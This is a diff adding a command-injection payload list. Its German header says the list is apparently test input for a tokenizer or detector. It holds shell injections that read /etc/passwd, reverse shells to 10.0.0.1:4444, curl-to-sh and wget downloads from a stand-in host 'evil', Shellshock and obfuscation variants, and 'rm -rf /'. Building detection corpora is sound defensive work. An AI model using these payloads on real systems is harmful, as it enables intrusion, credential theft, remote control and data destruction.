@@ -1,0 +1,44 @@
+# rce – Angriffs-Payloads (ein Payload pro Zeile; Kommentarzeilen beginnen mit #)
+# Hinweis: Platzhalter wie x-scr'ipt stehen für script-Varianten; der Tokenizer prüft die zusammengesetzten Formen.
+; id
+| id
+`id`
+$(id)
+; cat /etc/hostname
+| cat /etc/passwd
+&& whoami
+|| uname -a
+; sleep 10
+$(sleep 5)
+`sleep 5`
+; /bin/bash -i
+|/bin/sh
+; nc -e /bin/sh 10.0.0.1 4444
+; bash -c "id"
+; python -c "x"
+; perl -e "x"
+; php -r "x"
+;${IFS}cat${IFS}/etc/hostname
+{cat,/etc/passwd}
+|curl http://evil/x|sh
+; wget http://evil/x -O /tmp/x
+() { :; }; /bin/id
+;c'a't /etc/passwd
+; c"a"t /etc/hostname
+`/???/??t /???/??ss??`
+%0aid
+; powershell -enc ZQBjAGgAbwA=
+& whoami
+; ifconfig
+|| ping -c 10 127.0.0.1
+; rm -rf /tmp/x
+; chmod 777 /tmp/x
+a;cat /etc/hostname;b
+$(curl${IFS}evil)
+; /usr/bin/id
+; cmd.exe /c dir
+; certutil -urlcache -f http://e/x x
+|nc 10.0.0.1 4444 -e /bin/sh
+;cat$IFS$9/etc/passwd
+%26%26id
+`rm -rf /`
